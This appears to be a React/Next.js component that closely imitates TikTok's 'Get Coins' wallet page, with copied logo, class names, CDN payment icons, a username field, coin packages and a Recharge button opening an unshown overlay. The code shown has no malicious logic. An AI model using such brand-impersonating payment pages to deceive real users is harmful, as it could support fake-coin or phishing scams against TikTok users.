"use client"

import Image from "next/image";
import image from "./../image.jpeg"
import { useState } from "react";
import Overlay from './overlay';


export default function Page() {

    const ratePerCoin = 0.74/70;
    const [activeBtn, setActiveBtn] = useState(0);

    const [showOverlay, setShowOverlay] = useState(false);

    const handleClick = () => {
        setShowOverlay(true);
    };

    const handleClose = () => {
        setShowOverlay(false);
    };

    const [btnList, setBtnList] = useState([
        {
            coin: "70",
            price: "0.70",
            count: 0
        },
        {
            coin: "350",
            price: "3.7",
            count: 1
        },
        {
            coin: "700",
            price: "7.4",
            count: 2
        },
        {
            coin: "1,400",
            price: "14.8",
            count: 3
        },
        {
            coin: "3,500",
            price: "37",
            count: 4
        },
        {
            coin: "7,000",
            price: "74",
            count: 5
        },
        {
            coin: "17,500",
            price: "185",
            count: 6
        },
        {
            coin: "Custom",
            price: "Large amount supported",
            count: 7,
        },
    ]);

    const [changing, setChnaging] = useState(false)

    function refreshCustomButton() {
        btnList[7].coin = "Custom"
        btnList[7].price = "Large amount supported"
    }


    return (
        <main className="w-[100%]  h-[100vh]">
            <div className="header">
                <div className="header-inside">
                    <div className="tiktok-oteyea-DivLeftContainer">
                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 118 42" width="118" height="42" alt="TikTok"><path fill="#25F4EE" d="M9.875 16.842v-1.119A8.836 8.836 0 008.7 15.64c-4.797-.006-8.7 3.9-8.7 8.707a8.706 8.706 0 003.718 7.135A8.675 8.675 0 011.38 25.55c0-4.737 3.794-8.598 8.495-8.707z"></path><path fill="#25F4EE" d="M10.086 29.526c2.14 0 3.89-1.707 3.967-3.83l.006-18.968h3.463a6.78 6.78 0 01-.11-1.202h-4.726l-.006 18.969a3.978 3.978 0 01-3.967 3.829 3.93 3.93 0 01-1.846-.46 3.949 3.949 0 003.22 1.662zM23.992 13.166v-1.055a6.506 6.506 0 01-3.583-1.068 6.571 6.571 0 003.583 2.123z"></path><path fill="#FE2C55" d="M20.409 11.043a6.54 6.54 0 01-1.616-4.315h-1.265a6.557 6.557 0 002.88 4.316zM8.706 20.365a3.98 3.98 0 00-3.973 3.976c0 1.528.869 2.858 2.134 3.523a3.936 3.936 0 01-.754-2.321 3.98 3.98 0 013.973-3.976c.409 0 .805.07 1.175.185v-4.833a8.837 8.837 0 00-1.175-.083c-.07 0-.134.006-.204.006v3.708a3.999 3.999 0 00-1.176-.185z"></path><path fill="#FE2C55" d="M23.992 13.166v3.676c-2.453 0-4.727-.786-6.58-2.116v9.621c0 4.802-3.902 8.714-8.706 8.714a8.669 8.669 0 01-4.988-1.579 8.69 8.69 0 006.368 2.781c4.797 0 8.707-3.906 8.707-8.714v-9.621a11.25 11.25 0 006.579 2.116v-4.73c-.48 0-.94-.052-1.38-.148z"></path><path fill="black" d="M17.413 24.348v-9.622a11.251 11.251 0 006.58 2.116v-3.676a6.571 6.571 0 01-3.584-2.123 6.61 6.61 0 01-2.888-4.315H14.06l-.006 18.968a3.978 3.978 0 01-3.967 3.83A3.99 3.99 0 016.86 27.87a3.991 3.991 0 01-2.133-3.523A3.98 3.98 0 018.7 20.372c.409 0 .805.07 1.175.185v-3.708c-4.701.103-8.495 3.964-8.495 8.701 0 2.29.888 4.373 2.338 5.933a8.669 8.669 0 004.988 1.58c4.798 0 8.707-3.913 8.707-8.714zM30.048 13.179h14.774l-1.354 4.232h-3.832v15.644h-4.778V17.41l-4.804.006-.006-4.238zM69.032 13.179h15.12l-1.355 4.232h-4.17v15.644h-4.785V17.41l-4.804.006-.006-4.238zM45.73 19.502h4.733v13.553h-4.708l-.026-13.553zM52.347 13.128h4.733v9.257l4.689-4.61h5.646l-5.934 5.76 6.644 9.52h-5.213l-4.433-6.598-1.405 1.362v5.236H52.34V13.128h.006zM102.49 13.128h4.734v9.257l4.688-4.61h5.647l-5.934 5.76 6.643 9.52h-5.206l-4.433-6.598-1.405 1.362v5.236h-4.734V13.128zM48.093 17.954a2.384 2.384 0 002.382-2.384 2.384 2.384 0 10-2.382 2.384z"></path><path fill="#25F4EE" d="M83.544 24.942a8.112 8.112 0 017.474-8.087 8.748 8.748 0 00-.709-.026c-4.478 0-8.106 3.631-8.106 8.113 0 4.482 3.628 8.113 8.106 8.113.21 0 .498-.013.71-.026-4.178-.326-7.475-3.823-7.475-8.087z"></path><path fill="#FE2C55" d="M92.858 16.83c-.217 0-.505.012-.716.025a8.111 8.111 0 017.468 8.087 8.112 8.112 0 01-7.468 8.087c.211.02.499.026.716.026 4.478 0 8.106-3.631 8.106-8.113 0-4.482-3.628-8.113-8.106-8.113z"></path><path fill="black" d="M91.58 28.887a3.94 3.94 0 01-3.94-3.945 3.94 3.94 0 117.882 0c0 2.18-1.77 3.945-3.942 3.945zm0-12.058c-4.477 0-8.106 3.631-8.106 8.113 0 4.482 3.629 8.113 8.106 8.113 4.478 0 8.106-3.631 8.106-8.113 0-4.482-3.628-8.113-8.106-8.113z"></path></svg>
                    </div>
                    <div className="tiktok-1x100u9-DivHeaderCenterContainer">
                        <div className="tiktok-1asq5wp-DivSearchFormContainer">
                            <div className="tiktok-dhqzc6-FormElement">
                                <form className="search-input tiktok-dhqzc6-FormElement e14ntknm0" action="/search">
                                    <input placeholder="Search" name="q" type="search" autocomplete="off" role="combobox" aria-controls="" aria-label="Search" aria-expanded="false" aria-autocomplete="list" data-e2e="search-user-input" className="tiktok-v082c6-InputElement e14ntknm3" /><span className="tiktok-hck1rr-SpanSpliter e14ntknm6"></span><button type="submit" aria-label="Search" data-e2e="search-button" className="tiktok-16dy42q-ButtonSearch e14ntknm7"><div className="tiktok-17iic05-DivSearchIconContainer e14ntknm8">
                                        <svg width="24" data-e2e="" height="24" viewBox="0 0 48 48" fill="rgba(22, 24, 35, .34)" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M22 10C15.3726 10 10 15.3726 10 22C10 28.6274 15.3726 34 22 34C28.6274 34 34 28.6274 34 22C34 15.3726 28.6274 10 22 10ZM6 22C6 13.1634 13.1634 6 22 6C30.8366 6 38 13.1634 38 22C38 25.6974 36.7458 29.1019 34.6397 31.8113L43.3809 40.5565C43.7712 40.947 43.7712 41.5801 43.3807 41.9705L41.9665 43.3847C41.5759 43.7753 40.9426 43.7752 40.5521 43.3846L31.8113 34.6397C29.1019 36.7458 25.6974 38 22 38C13.1634 38 6 30.8366 6 22Z"></path></svg></div></button><div className="tiktok-1mdii59-DivInputBorder e14ntknm1"></div></form>
                            </div>
                        </div>
                    </div>
                    <div className="tiktok-ba55d9-DivHeaderRightContainer">
                        <div className="tiktok-gcx66p-DivUploadContainer">
                            <div className="tiktok-1qup28j-DivUpload e18d3d944"><svg className="tiktok-qeydvm-StyledPlusIcon e18d3d945" width="1em" data-e2e="" height="1em" viewBox="0 0 16 16" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M8 2.5C7.58579 2.5 7.25 2.83579 7.25 3.25V7.25H3.25C2.83579 7.25 2.5 7.58579 2.5 8C2.5 8.41421 2.83579 8.75 3.25 8.75H7.25V12.75C7.25 13.1642 7.58579 13.5 8 13.5C8.41421 13.5 8.75 13.1642 8.75 12.75V8.75H12.75C13.1642 8.75 13.5 8.41421 13.5 8C13.5 7.58579 13.1642 7.25 12.75 7.25H8.75V3.25C8.75 2.83579 8.41421 2.5 8 2.5Z"></path></svg><span className="tiktok-y3rt08-SpanUploadText e18d3d946">Upload </span></div>
                        </div>

                        <div data-e2e="top-dm-icon" className="tiktok-1ibfxbr-DivMessageIconContainer e1nx07zo0"><a aria-label="Open messages" className="tiktok-22xkqc-StyledLink er1vbsz0" href="/messages?lang=en"><span><svg className="tiktok-y48l9g-StyledIcon e1nx07zo1" width="2rem" data-e2e="" height="1.5rem" viewBox="0 0 48 48" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M2.17877 7.17357C2.50304 6.45894 3.21528 6 4.00003 6H44C44.713 6 45.372 6.37952 45.7299 6.99615C46.0877 7.61278 46.0902 8.37327 45.7365 8.99228L25.7365 43.9923C25.3423 44.6821 24.5772 45.0732 23.7872 44.9886C22.9972 44.9041 22.3321 44.3599 22.0929 43.6023L16.219 25.0017L2.49488 9.31701C1.97811 8.72642 1.85449 7.88819 2.17877 7.17357ZM20.377 24.8856L24.531 38.0397L40.5537 10H8.40757L18.3918 21.4106L30.1002 14.2054C30.5705 13.9159 31.1865 14.0626 31.4759 14.533L32.5241 16.2363C32.8136 16.7066 32.6669 17.3226 32.1966 17.612L20.377 24.8856Z"></path></svg></span></a></div>
                        <div data-e2e="top-dm-icon" className="tiktok-1ibfxbr-DivMessageIconContainer e1nx07zo0"><a aria-label="Open messages" className="tiktok-22xkqc-StyledLink er1vbsz0" href="/messages?lang=en"><span>
                            <svg className="" width="2rem" data-e2e="" height="1.8rem" viewBox="0 0 32 32" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M24.0362 21.3333H18.5243L15.9983 24.4208L13.4721 21.3333H7.96047L7.99557 8H24.0009L24.0362 21.3333ZM24.3705 23.3333H19.4721L17.2883 26.0026C16.6215 26.8176 15.3753 26.8176 14.7084 26.0026L12.5243 23.3333H7.62626C6.70407 23.3333 5.95717 22.5845 5.9596 21.6623L5.99646 7.66228C5.99887 6.74352 6.74435 6 7.66312 6H24.3333C25.2521 6 25.9975 6.7435 26 7.66224L26.0371 21.6622C26.0396 22.5844 25.2927 23.3333 24.3705 23.3333ZM12.6647 14C12.2965 14 11.998 14.2985 11.998 14.6667V15.3333C11.998 15.7015 12.2965 16 12.6647 16H19.3313C19.6995 16 19.998 15.7015 19.998 15.3333V14.6667C19.998 14.2985 19.6995 14 19.3313 14H12.6647Z"></path></svg>

                        </span></a></div>
                        <Image src={image} width={32} height={32} className="ml-[24px] bg-center rounded-full" />


                    </div>
                </div>
            </div>

            <div className="tiktok-1qjl7qr-DivMainContainer">
                <section className="tiktok-18xp9s9-SectionContentWrapper">
                    <div className="tiktok-k58u1v-DivTitleInfoContainer e14cybcq1">
                        <h1 data-e2e="wallet-title-get-coins" className="tiktok-peg3xr-H1TitleInfoCoin e14cybcq2">Get Coins</h1>
                        <a data-e2e="wallet-transaction-history-entrance" className="tiktok-4rsttk-StyledTransactionHistoryLink e14cybcq3" href="/coin/transaction-history">View transaction history</a>
                    </div>
                    <div className="tiktok-krn24s-DivProfileAndBannerRow">
                        <div className="tiktok-d2sjra-DivProfileInfo">
                            <div role="button" aria-controls="" data-e2e="profile-icon" className="tiktok-1igqi6u-DivProfileContainer"></div>
                            <div className="tiktok-9l16e2-DivNameCoinInfo e14cybcq10">
                                <span data-e2e="wallet-user-name" className="tiktok-tkaxf7-SpanNameInfo e14cybcq12">imsulav</span>
                                <div className="tiktok-6vx15k-DivCoinInfo e14cybcq11">
                                    <svg className="tiktok-908odc-StyledCoinIcon e14cybcq5" width="1em" data-e2e="" height="1em" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="24" cy="24" r="22" fill="#FFEC9B"></circle><circle cx="24" cy="24" r="17" fill="#FACE15"></circle><path fill-rule="evenodd" clip-rule="evenodd" d="M40.9347 25.5C40.9779 25.0058 41 24.5055 41 24C41 14.6112 33.3888 7 24 7C14.6112 7 7 14.6112 7 24C7 24.5055 7.02206 25.0058 7.06527 25.5C7.82466 16.8137 15.1166 10 24 10C32.8834 10 40.1753 16.8137 40.9347 25.5Z" fill="#FABC15"></path><path d="M33 19C30.2041 19 27.9375 16.7614 27.9375 14H24.5625V27.6111C24.5625 29.2986 23.1774 30.6667 21.4688 30.6667C19.7601 30.6667 18.375 29.2986 18.375 27.6111C18.375 25.9236 19.7601 24.5556 21.4688 24.5556C21.722 24.5556 21.9659 24.5853 22.1981 24.6406C22.2365 24.6497 22.2747 24.6596 22.3125 24.6701V21.2763C22.0358 21.2406 21.7541 21.2222 21.4688 21.2222C17.8962 21.2222 15 24.0826 15 27.6111C15 31.1396 17.8962 34 21.4688 34C25.0413 34 27.9375 31.1396 27.9375 27.6111V20.6673C29.3477 21.7134 31.1005 22.3333 33 22.3333V19Z" fill="#FEF5CD"></path></svg>
                                    <span data-e2e="wallet-coins-balance" className="tiktok-puwl6j-SpanCoinNum e14cybcq4">2500000</span>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="input mt-4 w-[15vw]">
                        <div class="relative rounded-xl bg-[#F9F9F9]">
                            <input class="border-0 py-2 pr-8 pl-3 bg-transparent focus:outline-none" type="text" placeholder="Username" />
                            <span class="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500">
                                <svg width="24" data-e2e="" height="24" viewBox="0 0 48 48" fill="rgba(22, 24, 35, .34)" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M22 10C15.3726 10 10 15.3726 10 22C10 28.6274 15.3726 34 22 34C28.6274 34 34 28.6274 34 22C34 15.3726 28.6274 10 22 10ZM6 22C6 13.1634 13.1634 6 22 6C30.8366 6 38 13.1634 38 22C38 25.6974 36.7458 29.1019 34.6397 31.8113L43.3809 40.5565C43.7712 40.947 43.7712 41.5801 43.3807 41.9705L41.9665 43.3847C41.5759 43.7753 40.9426 43.7752 40.5521 43.3846L31.8113 34.6397C29.1019 36.7458 25.6974 38 22 38C13.1634 38 6 30.8366 6 22Z"></path></svg>
                            </span>
                        </div>
                    </div>

                </section>
                <div data-e2e="wallet-buy-coins-title" className="tiktok-xx4hck-DivRechargeCoins eyr93xl0">Recharge<span className="tiktok-z95cm-SpanContentContainer e13as4wb0"><div data-e2e="wallet-recharge-advantage-tip" className="tiktok-ie54vw-DivRechargeAdvantageInfo e13as4wb2"><span className="tiktok-1rwkvc8-SpanRechargeTitle e13as4wb3">: </span>Save up to 31% compared to in-app purchase<div tabindex="0" aria-describedby="webapp-advantage" data-e2e="wallet-recharge-advantage-icon" className="tiktok-1lfugd2-DivExplanationContainer e13as4wb4"><svg className="tiktok-n2pfir-StyledExclamationMarkCircleIcon e13as4wb5" width="1em" data-e2e="" height="1em" viewBox="0 0 48 48" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M24 6C14.0589 6 6 14.0589 6 24C6 33.9411 14.0589 42 24 42C33.9411 42 42 33.9411 42 24C42 14.0589 33.9411 6 24 6ZM2 24C2 11.8497 11.8497 2 24 2C36.1503 2 46 11.8497 46 24C46 36.1503 36.1503 46 24 46C11.8497 46 2 36.1503 2 24ZM27 16C27 17.6569 25.6569 19 24 19C22.3431 19 21 17.6569 21 16C21 14.3431 22.3431 13 24 13C25.6569 13 27 14.3431 27 16ZM23 22C22.4477 22 22 22.4477 22 23V34C22 34.5523 22.4477 35 23 35H25C25.5523 35 26 34.5523 26 34V23C26 22.4477 25.5523 22 25 22H23Z"></path></svg></div></div></span></div>
                <div className="tiktok-1un7bi9-DivCoinsBkgContainer">
                    <ol className="tiktok-1a7iizi-OlCoinsListContainer">

                        {
                            btnList.map((item) => {


                                if (item.count === 7) {
                                    return (
                                        <li>
                                            <button className={`tiktok-1hkagfd-ButtonContainer  ${activeBtn === item.count ? "tiktok-1hkagfd-ButtonContainer-active" : ""}`} onClick={async () => {
                                                setActiveBtn(parseInt(item.count.toString()))
                                                btnList[7].coin = "hello"
                                                btnList[7].price = "30-2,500,000"
                                                if (changing === false) {
                                                    setChnaging(!changing)
                                                }
                                            }}>
                                                <div className="tiktok-16jd2dh-DivNumContainer">
                                                    <span className="tiktok-240y52-SpanNumIcon">
                                                        <svg className="tiktok-kkwvro-StyledCoinIcon e4yj8b611" width="2rem" data-e2e="" height="3rem" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="24" cy="24" r="22" fill="#FFEC9B"></circle><circle cx="24" cy="24" r="17" fill="#FACE15"></circle><path fill-rule="evenodd" clip-rule="evenodd" d="M40.9347 25.5C40.9779 25.0058 41 24.5055 41 24C41 14.6112 33.3888 7 24 7C14.6112 7 7 14.6112 7 24C7 24.5055 7.02206 25.0058 7.06527 25.5C7.82466 16.8137 15.1166 10 24 10C32.8834 10 40.1753 16.8137 40.9347 25.5Z" fill="#FABC15"></path><path d="M33 19C30.2041 19 27.9375 16.7614 27.9375 14H24.5625V27.6111C24.5625 29.2986 23.1774 30.6667 21.4688 30.6667C19.7601 30.6667 18.375 29.2986 18.375 27.6111C18.375 25.9236 19.7601 24.5556 21.4688 24.5556C21.722 24.5556 21.9659 24.5853 22.1981 24.6406C22.2365 24.6497 22.2747 24.6596 22.3125 24.6701V21.2763C22.0358 21.2406 21.7541 21.2222 21.4688 21.2222C17.8962 21.2222 15 24.0826 15 27.6111C15 31.1396 17.8962 34 21.4688 34C25.0413 34 27.9375 31.1396 27.9375 27.6111V20.6673C29.3477 21.7134 31.1005 22.3333 33 22.3333V19Z" fill="#FEF5CD"></path></svg>
                                                    </span>
                                                    <span data-e2e="wallet-package-coin-num-0" className="tiktok-1rj7qqx-SpanNumDisplay e4yj8b63">
                                                        {item && changing === true ? (
                                                            <>
                                                                <input onChange={(e) => {
                                                                    var value = (e.target.value).replace(",", "")

                                                                    var price = (parseInt(value) * ratePerCoin).toFixed(2);

                                                                    setBtnList(prevList => {
                                                                        const updatedList = [...prevList]; // Create a copy of the original array

                                                                        updatedList[7].coin = value
                                                                        updatedList[7].price = price.toString()

                                                                        if (updatedList[7].price === "NaN") {
                                                                            updatedList[7].price = "30-2,500,000"

                                                                        }

                                                                        return updatedList;
                                                                    });
                                                                }} data-e2e="wallet-package-coin-custom-input-box" type="number " pattern="[0-9]*" aria-describedby="error-tip" className="tiktok-1y6t4if-InputNum e4yj8b67"></input>
                                                            </>
                                                        ) : (
                                                            <>{item && item.coin}</>
                                                        )}
                                                    </span>

                                                </div>
                                                <div className="tiktok-1uetk1w-DivTextContainer">
                                                    <span data-e2e="wallet-package-price-0" className="tiktok-xo7i9f-SpanTextNow e4yj8b66">{item.price}</span>
                                                </div>
                                            </button>
                                        </li>
                                    );
                                }
                                return (
                                    <li>
                                        <button className={`tiktok-1hkagfd-ButtonContainer  ${activeBtn === item.count ? "tiktok-1hkagfd-ButtonContainer-active" : ""}`} onClick={async () => {
                                            setActiveBtn(parseInt(item.count.toString()))
                                            refreshCustomButton()
                                            setChnaging(false)
                                        }}>
                                            <div className="tiktok-16jd2dh-DivNumContainer">
                                                <span className="tiktok-240y52-SpanNumIcon">
                                                    <svg className="tiktok-kkwvro-StyledCoinIcon e4yj8b611" width="2rem" data-e2e="" height="3rem" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="24" cy="24" r="22" fill="#FFEC9B"></circle><circle cx="24" cy="24" r="17" fill="#FACE15"></circle><path fill-rule="evenodd" clip-rule="evenodd" d="M40.9347 25.5C40.9779 25.0058 41 24.5055 41 24C41 14.6112 33.3888 7 24 7C14.6112 7 7 14.6112 7 24C7 24.5055 7.02206 25.0058 7.06527 25.5C7.82466 16.8137 15.1166 10 24 10C32.8834 10 40.1753 16.8137 40.9347 25.5Z" fill="#FABC15"></path><path d="M33 19C30.2041 19 27.9375 16.7614 27.9375 14H24.5625V27.6111C24.5625 29.2986 23.1774 30.6667 21.4688 30.6667C19.7601 30.6667 18.375 29.2986 18.375 27.6111C18.375 25.9236 19.7601 24.5556 21.4688 24.5556C21.722 24.5556 21.9659 24.5853 22.1981 24.6406C22.2365 24.6497 22.2747 24.6596 22.3125 24.6701V21.2763C22.0358 21.2406 21.7541 21.2222 21.4688 21.2222C17.8962 21.2222 15 24.0826 15 27.6111C15 31.1396 17.8962 34 21.4688 34C25.0413 34 27.9375 31.1396 27.9375 27.6111V20.6673C29.3477 21.7134 31.1005 22.3333 33 22.3333V19Z" fill="#FEF5CD"></path></svg>
                                                </span>
                                                <span data-e2e="wallet-package-coin-num-0" className="tiktok-1rj7qqx-SpanNumDisplay e4yj8b63">{item.coin}</span>
                                            </div>
                                            <div className="tiktok-1uetk1w-DivTextContainer">
                                                <span data-e2e="wallet-package-price-0" className="tiktok-xo7i9f-SpanTextNow e4yj8b66">$ {item.price}</span>
                                            </div>
                                        </button>
                                    </li>
                                );
                            })
                        }


                    </ol>
                </div>
                <div className="tiktok-11ddo6h-DivTotalContainer">
                    <ul className="tiktok-fbshyx-UlPaymentMethodsContainer">
                        <li>
                            <span data-e2e="wallet-title-payment-method" className="tiktok-p0hyyy-SpanTotalText e1ndw46o2">Payment method</span>
                        </li>
                        <li>
                            <img src="https://lf16-co.g-p-static.com/obj/pipo-sgcompliance/sky/mastercard-gray-update_7b3ceb.svg" data-e2e="wallet-payment-icon-MASTER" alt="Mastercard" className="tiktok-1quc8c-ImgPaymentIcon e1ndw46o5" />
                        </li>
                        <li><img src="https://lf16-co.g-p-static.com/obj/pipo-sgcompliance/sky/visa_light_c558fb.svg" data-e2e="wallet-payment-icon-VISA" alt="Visa" className="tiktok-1quc8c-ImgPaymentIcon e1ndw46o5" /></li>
                        <li><img src="https://lf16-co.g-p-static.com/obj/pipo-sg/sky/maestro_188b29.svg" data-e2e="wallet-payment-icon-MAESTRO" alt="Maestro" className="tiktok-1quc8c-ImgPaymentIcon e1ndw46o5" /></li>
                        <li><img src="https://lf16-co.g-p-static.com/obj/pipo-sg/sky/card_american_express_v1_429e0f.svg" data-e2e="wallet-payment-icon-AMEX" alt="American Express" className="tiktok-1quc8c-ImgPaymentIcon e1ndw46o5" /></li>
                        <li><img src="https://lf16-co.g-p-static.com/obj/pipo-sgcompliance/sky/paypal-light-border_4305a4.svg" data-e2e="wallet-payment-icon-PAYPAL" alt="PAYPAL" className="tiktok-1quc8c-ImgPaymentIcon e1ndw46o5" /></li>

                    </ul>
                </div>

                <div className="tiktok-1fguu8v-DivTotalContainer">
                    <span data-e2e="wallet-title-total-price" className="tiktok-j4urqu-SpanTotalText e9ndt4q5">Total</span>
                    <span aria-live="polite" data-e2e="wallet-total-price" className="tiktok-uzytel-SpanTotalMount e9ndt4q6">$ {(btnList[activeBtn].price === "30-2,500,000") ? "0" : btnList[activeBtn].price}</span>
                </div>

                <div className="tiktok-vr1v8s-DivButtonContainer">
                    <button type="button" onClick={handleClick} data-e2e="wallet-button-buynow" aria-label="Recharge" aria-live="polite" className="e9ndt4q10 tiktok-19v97s1-Button-StyledBuyButton ehk74z00">Recharge</button>
                </div>
            </div>

            {showOverlay && <Overlay onClose={handleClose} money={btnList[activeBtn].coin} />}
        </main>
    );
}